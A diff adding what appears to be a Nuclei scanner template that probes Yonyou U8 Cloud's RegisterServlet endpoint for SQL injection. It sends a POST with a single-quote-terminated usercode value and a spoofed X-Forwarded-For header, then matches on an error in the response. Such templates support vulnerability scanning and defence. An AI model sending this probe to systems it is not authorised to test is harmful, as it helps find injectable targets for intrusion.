@@ -1,0 +1,27 @@
+id: yonyou-u8cloud-RegisterServlet-sqli
+
+info:
+  name: yonyou-u8cloud-RegisterServlet-sqli
+  author: yonyou-u8cloud-RegisterServlet-sqli
+  severity: high
+
+
+http:
+- raw:
+  - |
+    POST /servlet/RegisterServlet HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
+    Connection: close
+    Accept: */*
+    Accept-Language: en
+    Content-Type: application/x-www-form-urlencoded
+    X-Forwarded-For: 127.0.0.1
+
+    usercode=123456'
+
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && contains_all(body, '123456','Error:')
+
